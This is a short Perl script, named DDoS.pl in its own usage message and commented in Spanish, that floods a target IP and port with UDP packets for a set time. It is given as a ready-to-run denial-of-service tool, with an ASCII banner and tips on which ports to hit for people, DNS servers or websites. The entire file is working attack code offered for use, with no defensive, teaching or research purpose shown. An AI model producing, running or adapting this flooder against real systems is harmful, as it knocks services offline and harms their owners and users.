#!/usr/bin/perl
 
#Script Codded By - Lauzeek -
#Puerto - Usar '80' Para personas y Puerto 53 Para DNS o 8090 Para Sitios web.
#Packetes - Usar '100 - 1000' (Recomendado).
 
use Socket;
use strict;
 
print '
 
+----------------------------------------------------------------------------------+
|               |$$$$$$      |$$$$$$         $$$$$        /$$$$$$|                 |
|               |$$    $$|   |$$    $$|   |$$     $$|    |$$|                      |
|               |$$    $$|   |$$    $$|   |$$     $$|     \$$$$$\                  |
|               |$$    $$|   |$$    $$|   |$$     $$|         |$$|                 |
|               |$$$$$$$     |$$$$$$         $$$$$       |$$$$$$/                  |
+----------------------------------------------------------------------------------+

';
print "\n";
 
 
if ($#ARGV != 3) {
  print "\n\t\t\t***Script echo por lauzeek***\n";
  print "-Ej) perl DDoS.pl 1.1.1.1 80 1000 300\n";
  print "-lauzeek ataco la IP '1.1.1.1' por '300' segundos en puerto '80' usando '1000' packetes\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "No se pudo atacar a$ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~Para parar el ataque presionar \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "Para parar el ataque presionar 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
